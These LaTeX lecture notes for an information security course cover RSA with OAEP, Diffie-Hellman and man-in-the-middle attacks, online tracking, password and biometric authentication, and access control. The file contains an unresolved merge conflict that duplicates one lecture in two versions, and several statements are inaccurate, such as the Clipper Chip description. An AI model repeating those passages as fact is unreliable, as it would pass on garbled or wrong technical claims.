% Lecture 4: 22 September 2014
\sektion{4}{Asymmetric key cryptography}
Symmetric key: use the same key to encrypt and decrypt

Problems:
\begin{itemize}
    \item Integrity: Alice sending to Bob, Charlie, Diana, ...

        If Alice, Bob, Charlie, Diana all have key $k$, then Bob could compute
        a MAC on a message and deliever a message to Charlie and Diana, thereby
        forging a message

        It would be nice if Alice were the only one who could send a verified
        message without needing to append everyone's integrity key (one per
        recipient)
    \item Confidentiality: maybe only Alice should be able to decrypt a message
\end{itemize}

Asymmetric scheme: 1976, Diffie-Hellman(-Cox for British military)
\begin{itemize}
\item One key for encrypting, another for decrypting
\item One key for MAC, another for verifying it
\end{itemize}

\begin{definition}
{\bf ``public-key'' cryptography}

    Almost always:
    \begin{itemize}
        \item Generate key-pair such that can't derive one key from the other
        \item One key is kept private (only Alice knows it)
        \item Other key is public (everyone knows it)
    \end{itemize}
\end{definition}

\subsektion{RSA algorithm}
** We implemented this in hw2 **
\begin{itemize}
    \item Best-known, most used public key algorithm
    \item 1978, Rivest-Shamir-Adleman
\end{itemize}

{\bf How it works:}

To generate an RSA key pair,
\begin{enumerate}
    \item Pick large secret primes $p$, $q$ (randomly chosen, typically 2048
            bits)

        Done by generating odd numbers in range and testing if prime, throwing
        away if not prime and trying again. Primes are dense enough that this
        isn't too bad, and primality testing is also okay in terms of time.
    \item Define $N = pq$

        Useful fact: if $p$, $q$ are prime, for all $0 < x < pq$,
        $$x^{(p-1)(q-1)} \mod{pq} = 1$$
    \item Pick $e$ such that $0 < e < pq$, $e$ relatively prime to $(p-1)(q-1)$
    \item Find $d$ such that $ed \mod{(p-1)(q-1)} = 1$. You can use euclid's algorithm to find $d$.
\end{enumerate}
The public key is $(e, N)$ and the private key is $(d, N)\ [+(p,q)]$.

To encrypt or decrypt with public key:
$$\text{RSA}((e,N), x) = x^e \mod N$$
To encrypt or decrypt with private key:
$$\text{RSA}((d,N), x) = x^d \mod N$$

\begin{theorem*}``It works''
\end{theorem*}
\begin{proof}
    \begin{align*}
    \text{RSA}&((e,N), \text{RSA}((d,N), x))\\
    &= (x^d \mod{pq})^e \mod{pq}\\
    &= x^{de} \mod{pq}\\
    &= x^{a(p-1)(q-1)+1} \mod{pq} \text{, for some $a$}\\
    &= (x^{(p-1)(q-1)})^a x \mod{pq}\\
    &= (x^{(p-1)(q-1)} \mod{pq})^a x \mod{pq}\\
    &= 1^a x \mod{pq}\\
    &= x \mod{pq}\\
    &= x \text{, given $0 < x < pq$}
    \end{align*}
\end{proof}
Best known attack is to try factoring $N$ to get $p$, $q$
\subsektion{Why not use public-key always?}
\begin{itemize}
    \item It's slow ($\sim$1000x slower than symmetric); you're exponentiating huge numbers
    \item Key is big ($\sim$4k bits)
\end{itemize}
\subsektion{How to use public-key crpyto}
For confidentiality: (``your eyes only'')
\begin{itemize}
    \item Encrypt with public key
    \item Decrypt with private key
\end{itemize}
For integrity: (``digital signature'')
\begin{itemize}
    \item ``Sign'' by encrypting with private key
    \item ``Verify'' by decrypting with public key
\end{itemize}
\subsektion{Secure RSA}
!! Warning: Not secure as described above, need to fix !!\\

Problem 1:

Suppose $(e, N) = (3, N)$. Given ciphertext $8$ that was encrypted with $(3, N)$
it's trivial that $x^3 \mod N =8$ has $x = 2$. This shows that you may run into
trouble when encrypting small messages.\\

Problem 2 (Malleability):
\begin{align*}
\text{RSA}((d,N),x) \cdot \text{RSA}((d,N),y) \mod N &= (x^d \mod N)(y^d \mod N) \mod N\\
&= (xy)^d \mod N\\
&= \text{RSA}((d,N), xy)
\end{align*}

$\text{RSA}((d,N), xy)$ is the signature for the message $xy$! Adversary could use this to win the game defining security of the cipher

\begin{definition}
{\bf Malleability}

Adversary can manipulate ciphertext, get predictable result for decrypted
plaintext.

This is usually bad, but sometimes we want a malleable cipher (for some
application)
\end{definition}

Lesser problems:
\begin{itemize}
    \item Same plaintext results in same ciphertext (deterministic)
    \item No built-in integrity check
\end{itemize}

To solve all these problems, add a preprocessing step before encryption. The
standard way is call OAEP (Optimal Asymmetric Encyption Padding):
\begin{enumerate}
    \item Generate 128 bit random value, run through PRG $G$
    \item XOR with message padded with 128 bits of zeros
    \item Run result through PRF $H$, a hash function with announced key
    \item XOR with the random bits
    \item Concatenate result and send to RSA encyption
\end{enumerate}

\makebox[2cm]{}\makebox[1.5cm]{128 bits}\makebox[.5cm]{}\makebox[2cm]{128 bits}\\
\framebox[3.5cm]{\makebox[2cm]{message}\textbar\makebox[1.5cm]{000...}}\makebox[.5cm]{}\framebox[2cm]{random}\\
\makebox[6cm]{\makebox[3.5cm]{$\downarrow$}\makebox[.5cm]{}\makebox[2cm]{$\downarrow$}}\\
\makebox[1.5cm]{}\makebox[.5cm]{$\oplus$}\makebox[2.8cm]{$\longleftarrow\quad G\quad\longleftarrow$}\makebox[.4cm]{$\downarrow$}\\
\makebox[6cm]{\makebox[3.5cm]{$\downarrow$}\makebox[.5cm]{}\makebox[2cm]{$\downarrow$}}\\
\makebox[1.5cm]{}\makebox[.5cm]{$\downarrow$}\makebox[2.8cm]{$\longrightarrow\quad H\quad\longrightarrow$}\makebox[.4cm]{$\oplus$}\\
\makebox[1.5cm]{}\makebox[.5cm]{$\downarrow$}\makebox[2.8cm]{\rule[-0.1cm]{2.8cm}{0.01cm}}\makebox[.4cm]{$\downarrow$}\\
\makebox[1.5cm]{}\makebox[.5cm]{}\makebox[2.8cm]{$\downarrow$}\makebox[.4cm]{}\\
\makebox[1.5cm]{}\makebox[.5cm]{}\makebox[2.8cm]{to RSA encrpytion}\makebox[.4cm]{}\\

Also add the reverse as a postprocessing step after decryption:

\makebox[1.5cm]{}\makebox[.5cm]{}\makebox[2.8cm]{from RSA encrpytion}\makebox[.4cm]{}\\
\makebox[1.5cm]{}\makebox[.5cm]{}\makebox[2.8cm]{$\downarrow$}\makebox[.4cm]{}\\
\makebox[1.5cm]{}\makebox[.5cm]{$\downarrow$}\makebox[2.8cm]{\rule[0.3cm]{2.8cm}{0.01cm}}\makebox[.4cm]{$\downarrow$}\\
\makebox[1.5cm]{}\makebox[.5cm]{$\downarrow$}\makebox[2.8cm]{$\longrightarrow\quad H\quad\longrightarrow$}\makebox[.4cm]{$\oplus$}\\
\makebox[6cm]{\makebox[3.5cm]{$\downarrow$}\makebox[.5cm]{}\makebox[2cm]{$\downarrow$}}\\
\makebox[1.5cm]{}\makebox[.5cm]{$\oplus$}\makebox[2.8cm]{$\longleftarrow\quad G\quad\longleftarrow$}\makebox[.4cm]{$\downarrow$}\\
\makebox[6cm]{\makebox[3.5cm]{$\downarrow$}\makebox[.5cm]{}\makebox[2cm]{$\downarrow$}}\\
\framebox[3.5cm]{\makebox[2cm]{$m'$}\textbar\makebox[1.5cm]{$z'$}}\makebox[.5cm]{}\framebox[2cm]{$r'$}\\

Reject if $z'$ is not all zero, otherwise throw away $r'$ and let $m'$ be the
result of the decyption. $m'$ should at this point be equal to the original
message.

Other things to clean up:
\begin{itemize}
    \item Key size
    \begin{itemize}
        \item To get a big enough key space, need lots of possible primes
        \item Factoring is better than brute force
        \item Factoring algorithms might get better, so build in cushion in key
            size to account for incremental improvements in these algorithms.
        \item Today, 2048-bit primes seem okay
    \end{itemize}
    \item Useful performance trick
    \begin{itemize}
        \item $e = 3$ and make sure $p$ and $q$ are chosen
    such that 3 is relatively prime to $p-1$ and $q-1$
        \item This is extra-big win
    for digital signatures since verify is the common case.
        \item But: what if OAEP disappears from your code?

        Use $e=65537=2^{16} + 1$ instead 
    \end{itemize}
    \item Hybrid crypto: To encrypt a large message,
    \begin{itemize}
        \item Generate random symmetric key $k$
        \item Encrypt $k$ with RSA
        \item Encrypt message with $k$
    \end{itemize}
        Sometimes share the symmetric key using RSA and use that to generate
        further keys to avoid using public-key crypto more than necessary
    \item Hybrid digital signatures: RSA sign(Hash(message))
    \item Claimed identities\\
        Suppose we get a message from ``Alice'' with a digital signature $m^d
        \mod N$. We can verify using $(m^d \mod N)^e \mod N$, but how can we be
        sure of Alice's public key if we don't know Alice?

        Use a digitial certificate (``cert''):
        \begin{itemize}
            \item Bob signs a message saying ``Alice's public key is (...)''
            \item This works if we know Bob and believe him to be trustworthy
                and competent.
            \item If we don't know Bob, then we need to ask Charlie if Bob is
                trustworthy and compentent.
            \item But if we don't know Charlie...
            \item Most common solution: pick universally trustworthy
                ``certificate authority'' who gives out keys\\
        \end{itemize}

        There is also the Web of Trust approach
        \begin{itemize}
            \item Everybody certifies their friends, and if you can find a mutual 
                friend, you're good and people will trust you.
        \end{itemize}
\end{itemize}
}{
% Lecture 5: 01 October 2012
\sektion{5}{Key Management}
\sidenote{
    US for a long time put restrictions on export of cryptographic software, the
    same restrictions as munitions, requiring a special license.

    Java, for example, would have liked to include crypto along with runtime
    libraries but hard to get license. Possible solutions:
    \begin{itemize}
    \item plugin architecture: could plug-in if they have their own
    \item designed libraries in a way convenient for people who want to
        implement their own crypto (export general purpose math library without
        the export-control issues.
    \end{itemize}
}
\subsektion{How big should keys be?}
A key should be so big an adversary has negligible chance of guessing it.
\begin{itemize}
    \item Watch out for Moore's law (adversary's capabilities increase by one
        bit every 18 months)
    \item For symmetric ciphers, 128 bits is plenty: $2^{128} \approx 10^{39}$,
        so at 1 trillion guesses per second, takes 10 quadrillion times the
        lifetime of the universe.
    \item Need larger for PRF/hash: suppose we're using for digital signature,
        then we're in trouble if adversary finds a ``collision'' ($x_1 \neq x_2$
        s.t. $H(x_1) = H(x_2)$). Finding a collision is more efficient than
        finding key.

        \sidenote{
            {\bf ``Birthday attack'':}

            Generate $2^{b/2}$ items at random, look for collisions in that set
            ($b$ is the bit-length of your hash). Odds are $\sim$50\%.

            Attack requires O($2^{b/2}$) time and O($2^{b/2}$) space, also
            possible in constant space.

            Pepople can generate invalid digital certificates through exploiting
            these collisions.
        }
        Upshot: PRF output size is typically 2x cipher output size to be safe
        (256 bits)
\end{itemize}

\subsektion{Key management principles}
\begin{enumerate}
\setcounter{enumi}{-1}
    \item Key management is the hard part
    \item Keys must be strongly (pseudo)random
    \item Different keys for different purposes (signing/encrypting, encrypting
        vs MACing, Alice - Bob vs Bob - Alice, different protocols)
    \item Vulnerability of a key increases
    \begin{itemize}
        \item the more you use it
        \item the more places you store it
        \item the longer you have it
    \end{itemize}
    So change keys that get ``used up'', and use ``session keys''. If Alice and
    Bob share a long-term key, generate a fresh key just for now and use the
    long-term key to ``handshake'' and agree on which fresh key to use.
    \item The hardest key to compromise is one that's not in accessible storage
        (e.g. a key that's in a drive locked in a safe)
    \item Protect yourself against compromise of old keys (forward secrecy);
        destroy keys when you're done with them (and keep track of where the
        keys are)
\end{enumerate}

{\bf Diffie-Hellman key exchange (D-H):} 1976\\
Like RSA, relies on a hardness assumption. Here, rely on hardness of ``discrete
log'' problem (given $g^x \mod p$, find $x$). $g,p$ are public, and $p$ is a
large prime.

\begin{table}[h!]
\centering
\begin{tabular}{cccc}
Alice & & Bob & \\
\cline{1-3} & & & \multirow{8}{*}{\begin{sideways}$\xleftarrow{\quad\qquad\text{time}\qquad\quad}$\end{sideways}}\\
& agree on $g,p$ (public), & & \\
& $p = 2q+1$, $q$ prime (``safe prime'') & & \\
random $a$, & & random $b$, & \\
$1 < a < p-1$ & & $1 < b < p-1$ & \\
& $\xrightarrow{g^a \mod p} \xleftarrow{g^b \mod p}$ & & \\
$\left(g^b \mod p\right)^a \mod p$ & & $\left(g^a \mod p\right)^b \mod p$ & \\
$= g^{ba} \mod p$ & & $= g^{ab} \mod p$ &
\end{tabular}
\end{table}

Adversary's best attack is to try to solve the discrete log problem. So Alice
and Bob know something that nobody else knows.

In practice, use $H(g^{ab} \mod p)$ as a shared secret.

BUT: works against an evesdropper (``passive adversary'', ``Eve'') but insecure
if adversary can modify messages (``man in the middle'', ''MITM'' attack)

\begin{table}[h!]
\centering
\begin{tabular}{ccccc}
Alice & & Mallory & & Bob\\
\hline
$a$ & & $u \qquad v$ & & $b$\\
& $\xrightarrow{g^a \mod p}$ & & $\xleftarrow{g^b \mod p}$ &\\
& $\xleftarrow{g^u \mod p}$ & & $\xrightarrow{g^v \mod p}$ &\\
$g^{au} \mod p$ & $\xleftrightarrow{\qquad\quad}$ & $g^{au} \quad g^{av}$ & $\xleftrightarrow{\qquad\quad}$ & $g^{bv} \mod p$
\end{tabular}
\end{table}

Upshot: D-H gives you a secret shared with \emph{someone}.

Solution:
\begin{enumerate}
    \item Rely on physical proximity or recognition to know who's talking
    \item Consistency check: check that A, B end up with the same value $g^{ab}$
        or that A, B saw the same messages.
\end{enumerate}
How?

Use digital signature (by one party, typically the server)

If Bob can verify Alice's signature, but not the other way around, this still
works (say Alice is a well-known server).

This gives two properties at once:
\begin{itemize}
    \item A authenticates B or vice verse
    \item No MITM, so A and B have a shared secret
\end{itemize}

{\bf D-H and forward secrecy:}\\
Suppose Alice, Bob already have a shared key and want to negotiate a new key.
Then they can do a simple D-H key exchange, protected by old key, then get new
key.

If an adversary doesn't know the old key, can't tamper with the D-H messages.
Even if the adversary gets an old key, not knowing the old key \emph{in real
time} means Mallory can't attack the D-H exchange. So Alice and Bob get forward
secrecy with relatively low cost.

Another problem, similar to MITM:

\begin{table}[h!]
\centering
\begin{tabular}{ccccc}
Alice & & Mallory & & Bob\\
\hline
$a$ & & & & $b$\\
& $\xrightarrow{g^a \mod p}$ & & $\xleftarrow{g^b \mod p}$ &\\
& $\xleftarrow{\quad1\quad}$ & & $\xrightarrow{\quad1\quad}$ &\\
$1^a \mod p$ & & & & $1^b \mod p$
\end{tabular}
\end{table}

So abort if receive a 1. Another bad value is $p-1$.

Note: \begin{align*}
\left(p-1\right)^2 \mod p &= \left(p^2 - 2p + 1\right) \mod p\\
    &= (0-0+1) \mod p\\
    &= 1
\end{align*}
Then:
$$\left(p-1\right)^a \mod p = \begin{cases}1 &\mbox{if $a$ is even}\\
    p-1 &\mbox{if $a$ is odd}\end{cases}$$
So also abort if receive $p-1$.

If you chose a safe prime, $1$ and $p-1$ are the only bad values, and there's a
very small chance that one of these would be sent legitimately (plus Alice and
Bob may be checking to make sure they don't send them anyway).
}{
% Lecture 6: 03 October 2012
\sektion{6}{Privacy, Security, and Identity Online}
Guest lecturer Arvind Narayanan

Security vs Privacy

Do we use encrpytion for security or privacy? Depends

Example: You're sitting in a coffee shop and due to a weakness in the encryption
a creepy guy two tables away is sniffing the wireless and reading your Gmail. Is
this a security or privacy breach? Class answer: both

Privacy of email but compromised by security bug in the software

\subsektion{Online tracking}
``On the Internet, nobody knows you're a dog.'' -- now a complete reversal from
this situation, and now sites are trying to collect as much information on you
as possible (ads, personalization, ...)

Behavioral targeting: on the webpages, cookies, javascript, webbugs (1 px gifs)
tracking you; the third party domain is getting your information.

Refer header: whenever a page embeds another page, the 3rd party page gets an
extra header (top level url of page you're looking at)

Ad Network as auction between users/publishers and advertisers
\begin{itemize}
\item places ads
\item collecting your data to get what kind of ad is suited to you, not just the
page you're on
\end{itemize}

Third Party Tracking

All the information is going into a database: NOT aggregate

Who has access? Tons of companies

64 indepdendent tracking mechanisms on average on top 50 sites.

Aliasing: visit hi5.com with subdomain ad.hi5.com but DNS redirects to
ad.yieldmanager.com. Browser tricked since this works even if you block 3rd
party cookies.

Also flash cookies and browser fingerprinting.

Fingerprinting since our browsers are unique enough: user agent string, plugins

See \href{https://panopticlick.eff.org/}{panopticlick}.

User-agent string along: 10 bits of entropy, 84\% of fingerprints unique, with
Flash or Java, 94\% unique.
\subsektion{Anonymity vs pseudonymity vs identity}
``Don't worry, it's all anonymous''

Truly anonymous shouldn't be able to track you under a pseudonym in a different
session. (How the Internet started)

Pseudononymous can tell when same person comes back but don't know real-life
identiy. (Internet post-cookies)

Identity can get back to real-life identity.

Ways for websites to get your identity:
\begin{enumerate}
    \item Third party is sometimes a first party: have first party relationship
        with social networking sites but they're also as widgets on other pages

        Example: Facebook's Like button -- even if you don't click it, Facebook
        knows you were on that page
    \item Leakage of identifiers:

        \begin{tt}
        GET http://ad.doubleclick.net/adj/...\\
        Referer: http://submit.SPORTS.com/...?email=\color{red}{jdoe@email.com}\\
        Cookie: id=\color{red}{35c192bcfe0000b1...}\\
        \end{tt}

        Identity has been compromised now and in the future
    \item Third party buys your identity: free iPod scam passing your email to
        first party site
    \item Security bugs:
        \begin{itemize}
        \item http://google.com/profiles/me redirects to
            http://google.com/profiles/randomwalker

            In firefox, can put the url in a script tag, JavaScript throws error
            which includes the url, giving randomwalker or other identity just
            from visiting this random page

            Mozilla's solution: only tell original, not redirected URL
        \item Google spreadsheets: people don't necessarily understand can be
            public

            Can specify all in URL in search to get public spreadsheets

            Can embed invisible Google spreadsheet and look at ``Viewing now''
            on another machine-- how to tell which of these users to serve what
            to? Use lots of different spreadsheets. Assign users to a subset of
            10 spreadsheets, and then chance of overlap pretty low.

            Google fixed by showing user as Anonymous when on a public
            spreadsheet even when logged in, revealing identity only if
            explicitly shared with that user (and the user accepted).
        \end{itemize}
\end{enumerate}
\subsektion{How security bugs contribute to online tracking}
\begin{itemize}
    \item History sniffing and privacy:

        CSS :visited property; how can the web page figure out the color? Check
        in JavaScript
        \begin{itemize}
            \item getComputedStyle()
            \item cache timing: on page, try to download something as embedded;
                if visited before, faster due to caching
            \item server hit: based on if browser downloads image or not
        \end{itemize}
    \item Identity sniffing:
        \begin{itemize}
            \item All social networking sites have groups that users can join
            \item Users typically join multiple groups, some of which are public
            \item Group affiliations act as fingerprint
            \item Predictable group-specific URLs exist
        \end{itemize}
        Look through memebers of groups and see who matches in all the groups
        the user has joined

        Fix as browser: ensure that a site can't see what color a link is by
        keeping track of who (browser's rendering component vs programmatic
        component) is making the query

        Fix as social network: make the URLs not predictable
    \item One-click fraud: Display IP address and approximate location, so user
        assumes the site knows who you are

        What if the website actually has your identity and makes a credible
        threat?
    \item Not a bug:

        Facebook's instant personalization: Facebook tells partner sites who you
        are
\end{itemize}
}{
% Lecture 7: 08 October 2012
\sektion{7}{Authenticating people}
\sidenote{
    {\bf SHA-3}

NIST: 1997 new standardization effort to pick SHA-3

recently keccak picked
\begin{itemize}
    \item fast to implement to implement in software, and really fast in
        hardware
    \item in practice, probably will be implemented in software, but brute force
        search to break it will probably be done in hardware -- slight
        conspiracy theory that NIST picked so as to advantage attackers with
        larger resources
\end{itemize}
}
Authenticating: Make sure someone is who they claim to be

Three basic approaches, relying on
\begin{enumerate}
    \item something you \underline{know}
    \item something you \underline{have}
    \item something you \underline{are} (``biometrics'')
\end{enumerate}
\subsektion{Something you know: passwords}
First approach:
\begin{itemize}
    \item server has database of (name, password) pairs
    \item to log in, user gives name, password
    \item system verifies match
\end{itemize}
Attacks (to get a user's password):
\begin{itemize}
    \item trick the user into telling you -- surprisingly effective (``social
            engineering'')
    \item impersonate server, get user to ``log in'' to you (``spoofing'',
            ``phishing'')
    \item online guessing, try to log in with guessed name and password
    \item if user wrote down password, read it
    \item get a copy of password database (somehow)
    \item change the password database (somehow)
    \item watch the user log in, see what user types (``shoulder surfing'')
\end{itemize}
Countermeasures:
\begin{itemize}
    \item teach users not to divulge passwords (such as having a box saying
            ``AOL will never ask you for your password)
    \item make guessing harder
    \begin{itemize}
        \item limit number of failed attempts (``velocity control''), only for
                online guessing
        \item avoid informative error message if user fails to log in (so don't
                say username was right but password wrong)
            % tricky example: password doesn't match or memory error if does 
            % character-by-character comparison and put your password right
            % before unaccessible memory location so it'll memory error if first
            % character right; can then shift to get next part of prefix
    \end{itemize}
    \item server stores hash(password) rather than password, so password
            database doesn't convey passwords
    \item often, iterate hash: H(H(H(H(H...(password)...)))); slows brute-force
            search, but adversary can try ``dictionary attack'' -- hash many
            common passwords and build a handy retrieval data structure
    \item to frustrate dictionary attacks, use a ``salt'': for each user,
            generate a random value $S_u$, then store in password database
            (name, $S_u$, Hash(name || $S_u$ || password))

            Then an attacker would need to build a dictionary for each user

            Note that salt is in password database and it is convenient to keep
            secret, but hopefully password is strong enough for this to be okay
            even if the salt is leaked
\end{itemize}
Guessing is a serious problem in practive: people pick lousy passwords, and
attackers get more powerful all the time by Moore's law
% Prof Felten's story
% coffee and begging day's password for a week if sysadmin guessed your password

% Some study on univeristy passwords gave for one univeristy beer, love, hockey,
% jesus top passwords

Password hygiene
\begin{itemize}
    \item like key hygiene
    \item avoid patterns (``password1'', ``password2'', ...)
    \item expire idle sessions
    \item require old password to change password
\end{itemize}

What if user forgets password?
\begin{itemize}
    \item if hashed password is stored, can only set a new one
    \item else, can tell them password, BUT how do you know it's not an
            impostor?
    \item clever solution by Gmail: if all else fails, we'll give you a new
            password, but you'll need to wait before trying to log in again.
            Then legitimate user may log in and see a warning during that time
\end{itemize}

Preventing spoofing:
\begin{itemize}
    \item distinctive per-user display
    \item distinctive unspoofable action before login

        Windows CTRL-ALT-DEL before every time you enter password, always taking
        you to legitimate login screen
    \item use one-time-passwords

        security advantage, but logistical disadvantages: server has to serve
        more stuff, might run out at an inconvenient time
    \item hash-chain: user generates random value $x_0$ then chain with
        $x_{i+1} = H(x_i)$. The one-time passwords are
        $x_{n-1}, x_{n-2}, \dots, x_0$ in this order, and the server checks that
        each password is the hash of the next password. User remembers $x_0$
        and where in chain they are.
    \item challenge-response protocol: (sign a challenge value)
        \begin{table}\centering\begin{tabular}{ccc}
            user & & system\\
            \hline
            private key & & user's public key\\
            & $\xrightarrow{\text{name}}$ & \\
            & $\xleftarrow{r \text{ (random)}}$ & \\
            & $\xrightarrow{\text{sign} (r)}$ &
        \end{tabular}\end{table}
    \item password + Diffie-Hellman: SPEKE (Simple Password Exponential Key
            Exchange)

        Use D-H with public prime $p$, server stores
        $g = (\text{Hash(password)})^2 \mod p$

        Results:
        \begin{itemize}
            \item user, server get shared secret from D-H
            \item MITH attack doesn't work
            \item user only has to remember a password, not a key
        \end{itemize}
\end{itemize}
\subsektion{Something you have}
Typically, tamper-resistant device stores a key or some cryptographic secret.

It does crypto to prove the user has it.
\subsektion{Something you are}
\begin{definition}{biometric}

Measuring aspect of user's body: fingerprint, iris scan, retina scan, finger
length, voice properties, facial features
\end{definition}

Basic scheme:
\begin{itemize}
    \item enroll user: take a few measurements, compute ``exemplar''
    \item later, when user presents self, measure, compare to exemplar; compute
            ``distance'' to exemplar
    \item if ``close enough'', accept as valid user, else reject: tradeoff in
    threshold between false accepts and false rejects
\end{itemize}
Drawbacks:
\begin{itemize}
    \item hard/impossible to follow good key hygiene
    \item often requires physical presence
    \item spoofing attacks; make image of body part, faking tempertature,
            inductance, etc. (melted gummy bears moulded into finger-shape...)
\end{itemize}
}{
<<<<<<< HEAD
%!TEX root = InfoSec.tex
% Lecture 9: 6 October 2014
\sektion{8}{System Security}

\sidenote{
    \textbf{The Clipper Chip}\\
    This was a chip that implemented strong symmetric encryption; however it had a \textit{law enforcement access field} (LEAF), which gave the US government a backdoor to your data. Basically, if you wanted strong crypto you sacrificed privacy in the eyes of the government.\\

    The sender uses an 80 bit sessions key, a 32 bit unit key, and a 16 bit checksum value to create a unit key. Encrypt the unit key again and you get a family key (called a leaf) that is common to all chips.
}

\subsektion{Secure system design}
Secure components
\begin{itemize}
    \item in isolation (interaction only through approved interfaces)
    \item and access control (where access control = authentication; who is asking?)
    \item plus authorizaton (does the asker have the authority?)
\end{itemize}

\subsektion{Authorization}
\begin{enumerate}
    \item Access control matrix/list (like a bouncer with a list)
    \item Capabilities (like a physical key to open a lock)
\end{enumerate}

\textbf{Access control matrix}\\
SUBJECT wants to do VERB on OBJECT\\
- Are we going to allow it?\\

Policy: a set of allowed (subject, verb, object) triplets. So we have two questions now:
\begin{enumerate}
    \item How is policy set?
    \item How is policy enforced?\\
\end{enumerate}

\subsektion{Subjects and Objects}
The subject is a process and the object is some resource (file, open network connection, window, etc). We tend to use labels to simplify policy, and set policies based on these labels.

\begin{example}
Label a process with a userid, given that there is a limited set of users.
\end{example}

But things can get complicated
\begin{example}
Alice runs a program written by Bob. The program is a text editor and the file is code for Alice's startup.\\

How to label this program?
\begin{itemize}
    \item Treat as Alice: program can steal Alice's data
    \item Treat as Bob: Alice can read Bob's files
\end{itemize}

The common approah in OS (like Linux) is to setuid, where Bob decides if the program runs as himself or the invoker.
\end{example}

\subsektion{Storing the policy information}
\textbf{Access control matrix}\\
Matrix of subjects vs. objects with allowed verbs in each cell. The downfall with these is that you get a really really big matrix with lots of empty cells; it's inefficient. 

\textbf{Profiles}\\
For each user, they have access to their row of the matrix

\textbf{Access Control List (ACL)}\\
This is the most commont approach: For each objct, (subject, verb) pair, list whether it's allowed or not

\subsektion{Who sets up the ACL?}
\begin{itemize}
    \item Centralized, top-down policy

        Pro: Might be done by someone well-trained, might be required to be top-down (eg. medical and educational records)

        Con: Inflexible, slow (for example, might have to call a help desk)
    \item Decentralized

        Pro: super flexible

        Con: mistake-prone
    \item Mixed

        Owner can choose, within limits set by a centralized authority
\end{itemize}

\textbf{Groups}\\
Logically: a set of users or groups, such that you can give access to a group.

Advantages: Makes ACLs shorter, easier to understand. The group name may describe the reason for access in the system.

\textbf{Roles}\\
If a person ``wears several hats,'' you can have a role for each ``hat''. A user can step in/out of roles.

\subsektion{Traditional Unix file access}
A file belongs to one user or one group. The ACL for each operation contains some subset of (user, group, everyone).

setuserid bit: if executed, treat as file owner if setuid == true and treat as invoker if setuid == false.

\textbf{Capabilities}\\
``The bearer may do VERB on OBJECT''\\
By definition, if you have the capability, you can do the operation.
\begin{itemize}
    \item Cryptographic

    \begin{example}
    (VERB, OBJECT, PRF(k, VERB $||$ OBJECT)) where k is known only to the system. If you know the key k, you have the capability.
    \end{example}

    Pros: totally decentralized

    Cons: if capability leaks, everyone theoretically can get capability. Revocation is hard to do.

    \item OS tracking

    OS keeps track of which capabilities you have, you name them by index
\end{itemize}

\subsektion{Authorization Logics}
Formal logics, with \textbf{primitives} for PRINCIPALS (users, groups), OBJECTS, and PERMISSIONS and \textbf{rules} for delegation.

So, a user might present a bunch of true statements (``I am part of this group, Felton says that this group has access, etc.'') and the engine identifies if the logic implies that the user has permissions to access the file.

OR the system might require the user to come up with a proof that they have access privileges, in the form of a proof with formal logic.

=======
% Lecture 8: 10 October 2012
% System and software security - done with Crypto
\sektion{8}{Access control}
How you reason about and enforce rules about who's allowed to do what in the
system. 
\\
\\
Secure system design = secure components + isolation + access control.
\\
\\
This deals with authentication (Who is asking?), not authorization (Does that
person have permission?).
\\
\\
Two authorization approaches:
	\begin{itemize}
	\item access control matrix/list
	\item capabilities
	\end{itemize}

\begin{definition}{Trusted subsystem}\\
A program, with state, that is \underline{isolated} from
the rest of the world, and interacts via \underline{declared interfaces}
\end{definition}

Access control: SUBJECT wants to do VERB on OBECT. Okay?

Policy: a set of (S,V,O) triples that are allowed
\begin{itemize}
    \item How to determine policy? (\underline{should})
    \item How to enforce policy? (\underline{is})
\end{itemize}
One data structure: Access Control Matrix\\
\parbox[c]{5cm}{\makebox[5cm]{$\longleftarrow$ objects $\longrightarrow$}\\
\parbox[c]{1cm}{$\uparrow$\\
\begin{sideways}subjects\end{sideways}\\
$\downarrow$}
\makebox[.5cm]{}
\fbox{$V_1, V_2$}}

\subsektion{Subjects and labels}
\begin{itemize}
    \item subject = some process
    \item Object is some resource (file, open network connection, window)
    \item often, give labels to subjects and set policy based on labels
    e.g. label a process with a user id\\
    (+) reduces matrix size\\
    (+) easier to make policy based on labels\\
    (--) oversimplifies? Suppose: label = userid and means program is running
    ``for'' userid. Alice runs a program written by Bob (example: Alice uses a
        text editor written by Bob to edit Alice's secret file). What label?
    \begin{itemize}
        \item If treat as Alice: Bob's code can send Alice's secret data to Bob
        \item If treat as Bob: Alice can't edit her secret file, can read Bob's files
        \item If treat as Bob but special for this file: none of the labelling
        benefits
        \item If treat as intersection of privileges: get all the drawbacks
    \end{itemize}
    \item Common approach in OS (e.g. Linux): setuid bit
   	 \begin{itemize}
    	\item Bob decides whether program runs as himself or invoker
    	\end{itemize}
\end{itemize}
Store access control info:
\begin{itemize}
    \item as AC matrix - note that this will be very sparse
    \item as ``profiles'' - for each user, list of what subject can do (i.e. row of AC matrix)
    \item as Access Control List (ACL) - for each object, list of (Verb,
            Subject) pairs (who can do what to it). This is typically used
    because small and simple in practice. Often, ACL are stored along with object.
\end{itemize}
Who sets policy?
\begin{itemize}
    \item centralized (``mandatory'') - done by an authority

    (+) done by a well-trained person\\
    (+) might be required (ethical, legal, or contractual obligations)\\
    (--) inflexible, slow
    \item decentralized (``discretionary'') - each object has an
    \underline{owner}, owner set ACLs

    (+) flexible\\
    (--) every user makes security decisions (mistake-prone)
    
    \item mix - owner can choose, within limits set by centralized authority
\end{itemize}
Groups and Roles:\\
Group is a set of people with some logical basis; role is group with one
member\\
Advantages:
\begin{itemize}
    \item makes ACL smaller, easier to understand
    \item change in status naturally causes change in access to resources
    \item ACL encodes reason for access in system (i.e. why you have access)
\end{itemize}
Roles can be hidden temporarily, ``wearing different hats'' (useful for testing)

\subsektion{Traditional Unix File Access}
File belong to one user, one group. 
\\
\\ ACL for each operation contains subset of $\{\text{user}, \text{group}, \text{everyone}\}$. Every VERB requires 3 bits for each operation. 
\\
\\
Every file also has a setuserid bit. 
\begin{itemize}
	\item treat as file owner if setuid = true
	\ item treat as invoker if setuid = false
\end{itemize}

\subsektion{Capabilities}
A different approach to access control: controls access without identification,
like a physical key, ``the bearer has permission to do VERB on OBJECT.''

Sometimes make them revokable, but that's a pain to do in practice

Implementation: crpytographic
\begin{enumerate}
    \item system has a secret key $k$, capability = MAC($k$, verb || object)
    \item public-key: one party grant permission (makes digital signature),
    another party control access (makes sure handed valid capability - verifies
    signature)
\end{enumerate}
Implementation: OS table\\
OS stores a list of your capabilities; Alice makes a system call to give Bob
capabilities for a certain file (file descriptors used to say you've an open
file are an example)

Implementation: in a type-safe programming language (like Java), pointer to an
object is a capability
\\
\\
